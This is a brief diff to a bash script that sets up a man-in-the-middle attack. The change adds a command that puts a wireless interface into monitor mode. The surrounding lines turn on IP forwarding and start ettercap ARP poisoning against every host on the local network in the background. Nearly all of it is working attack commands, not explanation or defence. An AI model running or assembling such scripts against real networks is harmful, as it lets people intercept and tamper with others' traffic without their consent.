@@ -1,6 +1,7 @@
 #!/bin/bash
 echo "$(tput bold)$(tput setaf 1)start monitor mode$(tput sgr0)"
-#add monitor mode inside here
+sudo airmon-ng start wlan0
+wait
 echo "$(tput bold)$(tput setaf 1)MITM initialize$(tput sgr0)"
 sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning 
 sudo ettercap -T -Q -M arp -i eth0 // // &
